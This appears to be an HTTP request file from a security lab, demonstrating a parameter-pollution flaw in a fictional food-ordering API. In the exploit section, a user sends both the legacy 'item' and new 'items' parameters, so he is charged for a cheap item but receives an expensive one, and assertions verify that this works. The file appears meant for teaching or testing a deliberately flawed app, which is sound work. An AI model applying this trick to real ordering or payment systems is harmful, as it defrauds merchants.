# @import ../common/setup.http
@base = {{base_host}}/v101

### Plankton is a new beta-user and he needs to test a new feature: now customers can add multiple items to their order.
# He first checks the menu to see what items are available and what he wants to add to the order.
# @name menu
GET {{base}}/menu

{{
  const menuData = menu;
  exports.cheap_item = menuData.find(i => i.price < 5);
  exports.expensive_item = menuData.find(i => i.price > 20);
}}

# --- Legitimate Usage: Plankton tests the new `items` parameter ---

### Legitimate Usage
# Using `items` parameter, he adds multiple items to his order.
POST {{base}}/orders
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

items=2&items=3

### We can check that the order was created and the price was deducted from Plankton's balance.
GET {{base}}/orders
Authorization: {{plankton_auth}}

###
GET {{base}}/account/credits
Authorization: {{plankton_auth}}

# --- Legitimate Usage: SpongeBob tests the legacy `item` parameter ---

### Legitimate Usage
# SpongeBob is another beta-user, but he tests the legacy feature: adding a single item to his order.
POST {{base}}/orders
Authorization: {{spongebob_auth}}
Content-Type: application/x-www-form-urlencoded

item={{cheap_item.id}}

# --- Exploit: Plankton tries to pay for the cheap item but get the expensive one ---

# Plankton notices the kiosk accepts both `item` (legacy) and `items` (new) parameters.
# He wonders if he can pay for the cheap one but get the expensive one.
# @name exploit
POST {{base}}/orders
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

item={{cheap_item.id}}&items={{expensive_item.id}}

# Verification: Plankton pays $1.00 but the kitchen receives an order for the $20.50 feast.
?? status == 201
?? js response.parsedBody.total == {{cheap_item.price}}
?? js response.parsedBody.items[0].name == {{expensive_item.name}}

### Now if we check Plankton's balance, the cheaper item's price was deducted from his balance.
GET {{base}}/account/credits
Authorization: {{plankton_auth}}

### But he received the more expensive item instead.
GET {{base}}/orders
Authorization: {{plankton_auth}}
